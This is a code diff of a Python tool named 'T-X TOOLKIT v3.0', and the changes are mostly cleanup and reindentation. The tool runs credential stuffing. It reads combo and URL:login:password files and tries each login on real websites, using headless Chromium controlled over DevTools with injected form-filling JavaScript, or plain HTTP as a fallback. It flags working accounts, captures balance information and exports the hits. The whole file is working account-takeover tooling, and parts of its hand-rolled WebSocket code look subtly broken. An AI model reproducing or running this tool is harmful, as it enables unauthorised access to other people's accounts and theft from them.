@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-T-X TOOLKIT v3.0 
+T-X TOOLKIT v3.0
 Created by Saeka Tojirp
 Usage : tx
 """
 
-import os, sys, time, re, json, threading, random, hashlib, uuid, shutil, socket, ssl
+import os, sys, time, re, json, threading, random, hashlib, uuid, shutil, socket, ssl, subprocess
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, urljoin
@@ -35,18 +35,15 @@ USER_AGENTS = [
 
 # ── UTILS ──
 def tw(): return shutil.get_terminal_size().columns
-
 def fix_url(url):
     if not url: return url
     url = url.strip()
     if not url.startswith(('http://','https://')):
         url = 'https://' + url
     return url
-
 def center_print(text, color=W):
     w = tw()
     print(f"{color}{text.center(w)}{RES}")
-
 def spin(text, sec=1.2):
     frm = ['◜','◠','◝','◞','◡','◟']
     end = time.time()+sec; i=0
@@ -54,7 +51,6 @@ def spin(text, sec=1.2):
         sys.stdout.write(f"\r  {C}{frm[i%6]} {W}{text}{RES}"); sys.stdout.flush()
         time.sleep(0.08); i+=1
     sys.stdout.write("\r"+" "*50+"\r")
-
 def progress(cur, tot, label=""):
     if tot<=0: return
     pct = int((cur/tot)*100)
@@ -84,9 +80,7 @@ def detect_platform(url):
 class RealChromeChecker:
     def __init__(self):
         self.process = None
-
     def _start_browser(self):
-        """Launch headless Chromium with DevTools port."""
         args = [
             CHROME_PATH,
             "--remote-debugging-port=9222",
@@ -96,9 +90,7 @@ class RealChromeChecker:
         ]
         self.process = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(2)
-
     def _get_ws_url(self):
-        """Get DevTools WebSocket URL."""
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect(('127.0.0.1', 9222))
         req = "GET /json/version HTTP/1.1\r\nHost: 127.0.0.1:9222\r\nConnection: close\r\n\r\n"
@@ -107,15 +99,12 @@ class RealChromeChecker:
         sock.close()
         body = resp.split('\r\n\r\n', 1)[1]
         return json.loads(body)["webSocketDebuggerUrl"]
-
     def _ws_send(self, ws_url, method, params={}):
-        """Send command via raw WebSocket to DevTools."""
         p = urlparse(ws_url)
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ctx = ssl.create_default_context()
         s = ctx.wrap_socket(sock, server_hostname=p.hostname)
         s.connect((p.hostname, p.port))
-        # WebSocket handshake
         hs = (f"GET {p.path}?{p.query} HTTP/1.1\r\n"
               f"Host: {p.hostname}:{p.port}\r\n"
               f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
@@ -123,7 +112,6 @@ class RealChromeChecker:
               f"Sec-WebSocket-Version: 13\r\n\r\n")
         s.send(hs.encode())
         s.recv(4096)
-        # Send payload
         payload = json.dumps({"id":1,"method":method,"params":params})
         frame = b'\x81' + bytes([len(payload)]) + payload.encode()
         s.send(frame)
@@ -132,9 +120,7 @@ class RealChromeChecker:
         if len(resp) > 2:
             return json.loads(resp[2:])
         return {}
-
     def attempt_login(self, url, email, password):
-        """Real Chromium login attempt."""
         res = {
             'link':url, 'email':email, 'pass':password,
             'active':False, 'info':'', 'balance':'',
@@ -142,19 +128,12 @@ class RealChromeChecker:
             'platform':detect_platform(url)
         }
         url = fix_url(url)
-
         try:
             self._start_browser()
             ws = self._get_ws_url()
-
-            # Create page
-            target = self._ws_send(ws, "Target.createTarget", {"url":"about:blank"})
-
-            # Navigate
+            self._ws_send(ws, "Target.createTarget", {"url":"about:blank"})
             self._ws_send(ws, "Page.navigate", {"url":url})
             time.sleep(4)
-
-            # Fill form
             js_fill = f"""
                 const e = document.querySelector('input[type="email"], input[type="text"], input[name*="email"], input[name*="user"], input[name*="login"]');
                 const p = document.querySelector('input[type="password"]');
@@ -166,17 +145,13 @@ class RealChromeChecker:
             """
             self._ws_send(ws, "Runtime.evaluate", {"expression":js_fill})
             time.sleep(3)
-
-            # Check success
             js_check = "document.body.innerText.includes('Logout') || document.body.innerText.includes('My Account') || document.body.innerText.includes('Dashboard') || document.body.innerText.includes('Sign Out')"
             result = self._ws_send(ws, "Runtime.evaluate", {"expression":js_check})
             success = bool(result.get("result",{}).get("value",False))
-
             if success:
                 res['active'] = True
                 res['info'] = "Login successful (Chrome DOM)"
             else:
-                # Fallback: check URL redirect
                 js_url = "window.location.href"
                 url_check = self._ws_send(ws, "Runtime.evaluate", {"expression":js_url})
                 current_url = url_check.get("result",{}).get("value","")
@@ -186,17 +161,15 @@ class RealChromeChecker:
                 else:
                     res['active'] = False
                     res['info'] = "Still on login page"
-
         except Exception as e:
             res['info'] = f"Chrome error: {str(e)[:40]}"
         finally:
             if self.process:
                 self.process.terminate()
                 self.process = None
-
         return res
 
-# ── HTTP FALLBACK CHECKER ──
+# ── HTTP FALLBACK ──
 def http_login_check(url, email, password):
     res = {
         'link':url, 'email':email, 'pass':password,
@@ -263,7 +236,6 @@ def http_login_check(url, email, password):
 def generate_token(name):
     raw = f"{name}-{uuid.uuid4().hex}-{int(time.time())}"
     return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
-
 def request_token_once(name):
     if os.path.exists(APPROVED_FILE):
         with open(APPROVED_FILE,'r') as f:
@@ -280,7 +252,6 @@ def request_token_once(name):
             return token, 'pending'
     except: pass
     return token, 'pending'
-
 def wait_for_approval(token):
     while True:
         try:
@@ -302,12 +273,10 @@ def main():
         spin("Initialising...", 0.5)
         center_print("WELCOME TO T-X TOOLKIT", random.choice(COLOR_LOOP))
         time.sleep(0.5)
-
     os.system('clear')
     center_print("WHAT SHOULD YOUR NAME BE?", Y)
     name = input(f"  {W}> {RES}").strip()
     if not name: name = "User"
-
     os.system('clear')
     token, status = request_token_once(name)
     if status == 'approved':
@@ -378,7 +347,6 @@ def main():
             print(f"  {DIM}{'─'*90}{RES}")
             def worker(url,email,pw):
                 nonlocal done,active
-                # Try Chrome first, fallback to HTTP
                 res = checker.attempt_login(url,email,pw)
                 if not res['active'] and 'Chrome error' in res.get('info',''):
                     res = http_login_check(url,email,pw)
@@ -415,105 +383,95 @@ def main():
             print(f"  {G}Exported to {fn}{RES}"); time.sleep(1)
 
         elif choice=='4':
-    os.system('clear')
-    print(f"  {Y}BROWSE FOR COMBO FILE{RES}\n")
-    
-    dirs = [
-        os.path.expanduser("~"),
-        os.path.expanduser("~/downloads"),
-        "/sdcard",
-        "/storage/emulated/0",
-        "/storage/emulated/0/Download",
-    ]
-    dirs = [d for d in dirs if os.path.isdir(d)]
-    
-    print(f"  {W}Quick access:{RES}")
-    for i, d in enumerate(dirs):
-        print(f"  {G}[{i+1}]{RES} {d}")
-    print(f"  {G}[M]{RES} Manual path entry")
-    print(f"  {G}[0]{RES} Back\n")
-    
-    choice2 = input(f"  {W}> {RES}").strip()
-    
-    if choice2 == '0':
-        continue
-    elif choice2.upper() == 'M':
-        path = input(f"  {W}Enter full path: {RES}").strip()
-        path = os.path.expanduser(path)
-        if os.path.exists(path):
-            combo_file = path
-            print(f"  {G}File set!{RES}")
-        else:
-            print(f"  {R}Not found: {path}{RES}")
-        time.sleep(1)
-    elif choice2.isdigit() and 1 <= int(choice2) <= len(dirs):
-        current_dir = dirs[int(choice2)-1]
-        page = 0
-        per = 15
-        while True:
             os.system('clear')
-            print(f"  {Y}Browsing: {current_dir}{RES}\n")
-            
-            try:
-                items = sorted(os.listdir(current_dir))
-            except PermissionError:
-                print(f"  {R}Permission denied.{RES}")
-                time.sleep(1)
-                break
-            
-            visible = []
-            for item in items:
-                full = os.path.join(current_dir, item)
-                if os.path.isdir(full) and not item.startswith('.'):
-                    visible.append(('DIR', item))
-                elif os.path.isfile(full) and (item.endswith('.txt') or item.endswith('.combo') or 'combo' in item.lower() or 'ulp' in item.lower()):
-                    visible.append(('FILE', item))
-            
-            total_pages = (len(visible)-1)//per + 1 if visible else 1
-            start = page * per
-            for i, (typ, name) in enumerate(visible[start:start+per], start):
-                prefix = f"{C}[DIR]{RES}" if typ == 'DIR' else f"{W}[FILE]{RES}"
-                print(f"  {G}[{i+1}]{RES} {prefix} {name}")
-            
-            if not visible:
-                print(f"  {DIM}No compatible files found.{RES}")
-            
-            print(f"\n  {DIM}Page {page+1}/{total_pages} | [N]ext [P]rev [B]ack [M]anual{RES}")
-            sel = input(f"  {W}> {RES}").strip()
-            
-            if sel.upper() == 'B':
-                break
-            elif sel.upper() == 'N' and page < total_pages-1:
-                page += 1
-            elif sel.upper() == 'P' and page > 0:
-                page -= 1
-            elif sel.upper() == 'M':
+            print(f"  {Y}BROWSE FOR COMBO FILE{RES}\n")
+            dirs = [
+                os.path.expanduser("~"),
+                os.path.expanduser("~/downloads"),
+                "/sdcard",
+                "/storage/emulated/0",
+                "/storage/emulated/0/Download",
+            ]
+            dirs = [d for d in dirs if os.path.isdir(d)]
+            print(f"  {W}Quick access:{RES}")
+            for i, d in enumerate(dirs):
+                print(f"  {G}[{i+1}]{RES} {d}")
+            print(f"  {G}[M]{RES} Manual path entry")
+            print(f"  {G}[0]{RES} Back\n")
+            choice2 = input(f"  {W}> {RES}").strip()
+            if choice2 == '0':
+                continue
+            elif choice2.upper() == 'M':
                 path = input(f"  {W}Enter full path: {RES}").strip()
                 path = os.path.expanduser(path)
-                if os.path.isfile(path):
+                if os.path.exists(path):
                     combo_file = path
                     print(f"  {G}File set!{RES}")
-                    break
-                elif os.path.isdir(path):
-                    current_dir = path
-                    page = 0
                 else:
-                    print(f"  {R}Not found.{RES}")
-                    time.sleep(0.8)
-            elif sel.isdigit():
-                idx = int(sel) - 1
-                if 0 <= idx < len(visible):
-                    typ, name = visible[idx]
-                    full = os.path.join(current_dir, name)
-                    if typ == 'DIR':
-                        current_dir = full
-                        page = 0
-                    else:
-                        combo_file = full
-                        print(f"  {G}File set! → {full}{RES}")
+                    print(f"  {R}Not found: {path}{RES}")
+                time.sleep(1)
+            elif choice2.isdigit() and 1 <= int(choice2) <= len(dirs):
+                current_dir = dirs[int(choice2)-1]
+                page = 0
+                per = 15
+                while True:
+                    os.system('clear')
+                    print(f"  {Y}Browsing: {current_dir}{RES}\n")
+                    try:
+                        items = sorted(os.listdir(current_dir))
+                    except PermissionError:
+                        print(f"  {R}Permission denied.{RES}")
                         time.sleep(1)
                         break
-                        
+                    visible = []
+                    for item in items:
+                        full = os.path.join(current_dir, item)
+                        if os.path.isdir(full) and not item.startswith('.'):
+                            visible.append(('DIR', item))
+                        elif os.path.isfile(full) and (item.endswith('.txt') or item.endswith('.combo') or 'combo' in item.lower() or 'ulp' in item.lower()):
+                            visible.append(('FILE', item))
+                    total_pages = (len(visible)-1)//per + 1 if visible else 1
+                    start = page * per
+                    for i, (typ, name) in enumerate(visible[start:start+per], start):
+                        prefix = f"{C}[DIR]{RES}" if typ == 'DIR' else f"{W}[FILE]{RES}"
+                        print(f"  {G}[{i+1}]{RES} {prefix} {name}")
+                    if not visible:
+                        print(f"  {DIM}No compatible files found.{RES}")
+                    print(f"\n  {DIM}Page {page+1}/{total_pages} | [N]ext [P]rev [B]ack [M]anual{RES}")
+                    sel = input(f"  {W}> {RES}").strip()
+                    if sel.upper() == 'B':
+                        break
+                    elif sel.upper() == 'N' and page < total_pages-1:
+                        page += 1
+                    elif sel.upper() == 'P' and page > 0:
+                        page -= 1
+                    elif sel.upper() == 'M':
+                        path = input(f"  {W}Enter full path: {RES}").strip()
+                        path = os.path.expanduser(path)
+                        if os.path.isfile(path):
+                            combo_file = path
+                            print(f"  {G}File set!{RES}")
+                            break
+                        elif os.path.isdir(path):
+                            current_dir = path
+                            page = 0
+                        else:
+                            print(f"  {R}Not found.{RES}")
+                            time.sleep(0.8)
+                    elif sel.isdigit():
+                        idx = int(sel) - 1
+                        if 0 <= idx < len(visible):
+                            typ, name = visible[idx]
+                            full = os.path.join(current_dir, name)
+                            if typ == 'DIR':
+                                current_dir = full
+                                page = 0
+                            else:
+                                combo_file = full
+                                print(f"  {G}File set! → {full}{RES}")
+                                time.sleep(1)
+                                break
+
         elif choice=='5':
             break
 
